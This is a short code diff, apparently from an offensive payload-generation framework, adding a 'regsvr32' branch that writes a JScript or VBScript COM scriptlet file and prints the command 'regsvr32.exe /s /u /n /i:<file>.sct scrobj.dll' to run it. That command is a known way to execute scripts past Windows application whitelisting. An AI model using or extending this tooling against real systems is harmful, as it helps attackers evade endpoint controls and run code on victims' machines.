@@ -228,6 +228,28 @@ def compiler(payload_object, invoked=False, cli_object=None):
 
             else:
                 print(helpers.color("\n[!] Error: Script type not supported!\n", warning=True))
+        
+        elif payload_object.language == "regsvr32":
+
+            bypass_helpers.title_screen()
+            print_payload_information(payload_object)
+
+            if payload_object.required_options['SCRIPT_TYPE'][0].lower() == 'jscript':
+
+                print(" [*] COM Scriptlet code written to: " +
+                    helpers.color(source_code_filepath))
+                
+                print(" [*] Execute with: " + helpers.color("regsvr32.exe /s /u /n /i:{0}.sct scrobj.dll".format(file_name)))
+           
+            elif payload_object.required_options['SCRIPT_TYPE'][0].lower() == 'vbscript':
+                
+                print(" [*] COM Scriptlet code written to: " +
+                      helpers.color(source_code_filepath))
+
+                print(" [*] Execute with: " + helpers.color("regsvr32.exe /s /u /n /i:{0}.sct scrobj.dll".format(file_name)))
+
+            else:
+                print(helpers.color("\n[!] Error: Script type not supported!\n", warning=True))
 
         else:
             print(helpers.color("\n [!] ERROR: Invalid payload language in payload module.\n", warning=True))
